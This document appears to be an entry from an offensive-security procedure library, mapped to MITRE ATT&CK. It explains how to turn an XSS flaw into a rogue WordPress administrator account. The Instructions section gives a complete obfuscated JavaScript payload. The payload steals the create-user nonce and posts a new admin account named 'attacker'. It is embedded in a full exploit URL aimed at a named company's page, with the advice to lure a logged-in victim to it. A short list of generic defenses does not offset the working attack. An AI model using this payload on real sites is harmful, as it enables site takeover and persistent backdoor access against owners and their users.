---
id: uuid-craft-payload
tags:
  - xss
  - wordpress
  - admin-creation
  - ajax-exploitation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
commands: []
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T03:16:31.409Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Valid Accounts]]'
---
# Craft XSS Payload to Create WordPress Admin User via AJAX

## Summary

This procedure crafts an advanced JavaScript payload injected via XSS to automate the creation of a new administrator user in WordPress using AJAX requests for nonce extraction and user submission.

## Description

The payload uses eval and String.fromCharCode to obfuscate and execute code that: 1) Fetches the user-new.php page to regex-extract the _wpnonce_create-user value; 2) Posts to the same endpoint with admin creation parameters. Requires the victim to be a logged-in WordPress admin for session cookies. This escalates a simple XSS to full site compromise on PHP/WordPress environments.

## Requirements

1. Logged-in WordPress admin session (victim's browser)
2. JavaScript knowledge for payload construction
3. URL encoder for transmission

## Defense

Defensive measures and detection strategies:

- Enforce nonce validation and rate limiting on admin endpoints
- Use role-based access controls and audit user creation logs
- Implement XSS protections like HttpOnly cookies for sessions

## Objectives

1. Extract WordPress nonce via AJAX GET
2. Create unauthorized admin user via POST
3. Achieve persistence through backdoor account

## Instructions

### Step 1: Build Obfuscated Payload

**Context**: Create JavaScript to handle nonce fetch and user creation without direct script tags.

Payload base: eval(String.fromCharCode(118,97,114,32,...) ) – full char codes for the AJAX logic: GET /wp-admin/user-new.php, regex /ser" value="([^"]*?)"/g for nonce, then POST with action=createuser, _wpnonce_create-user=extracted, user_login=attacker, email=attacker@site.com, pass1=attacker, pass2=attacker, role=administrator.

Wrap in: email@teste.com</script><script>eval(...)</script>g8s3p

### Step 2: Encode and Inject

**Context**: URL-encode the full payload and insert into email parameter.

Full URL example: https://cz.acronis.com/dekujeme-za-odber-novinek-produktu-disk-director/?user=OK&oktosend=&email=email@teste.com%3C%2Fscript%3E%3Cscript%3Eeval(String.fromCharCode(118,97,114,32,110,61,120,109,108,104,116,116,112,40,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,41,59,110,46,111,112,101,110,40,39,71,69,84,39,44,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,39,44,116,114,117,101,41,59,110,46,115,101,110,100,40,41,59,110,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,118,97,114,32,109,61,110,46,114,101,115,112,111,110,115,101,84,101,120,116,46,109,97,116,99,104,40,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,41,59,105,102,40,109,41,123,118,97,114,32,110,111,110,99,101,61,109,91,49,93,59,118,97,114,32,112,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,40,41,59,112,46,111,112,101,110,40,39,80,79,83,84,39,44,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,39,44,116,114,117,101,41,59,112,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,39,67,111,110,116,101,110,116,45,84,121,112,101,39,44,39,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,59,99,104,97,114,115,101,116,61,85,84,70,45,56,39,41,59,112,46,115,101,110,100,40,39,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,39,43,110,111,110,99,101,43,39,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,39,41,59,125,125,59,125,40,41,59,59))</script>g8s3p

Lure victim to visit while logged in.

> Payload executes AJAX; monitor console for errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Persistence]]

### Techniques

- [[JavaScript]]
- [[Valid Accounts]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[wordpress]]
- [[admin-creation]]
- [[ajax-exploitation]]
